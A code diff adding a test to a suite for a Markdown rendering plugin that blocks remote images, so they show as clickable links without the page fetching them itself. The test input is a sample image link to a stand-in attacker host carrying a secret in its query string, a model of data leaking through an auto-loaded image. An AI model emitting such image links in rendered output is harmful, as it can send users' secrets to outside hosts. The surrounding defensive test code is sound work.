@@ -29,9 +29,15 @@ describe('rehypeBlockRemoteImages', () => {
     expect(html).not.toContain('src=')
     expect(html).toContain(`class="${BLOCKED_IMAGE_CLASS}"`)
     expect(html).toContain(BLOCKED_IMAGE_CHIP_TEXT)
-    // The URL survives only as an href/title the user can open deliberately -- never as
+    // The URL survives only as an href the user can open deliberately -- never as
     // something the page fetches on its own.
     expect(html).toContain('href="https://evil.example/x.png?leak=secret"')
+  })
+
+  it('omits the native title attribute on blocked remote image anchors', () => {
+    const html = render('![diagram](https://evil.example/x.png?leak=secret)')
+    expect(html).toContain('href="https://evil.example/x.png?leak=secret"')
+    expect(html).not.toContain('title=')
   })
 
   it('keeps the author alt text visible as the fallback', () => {
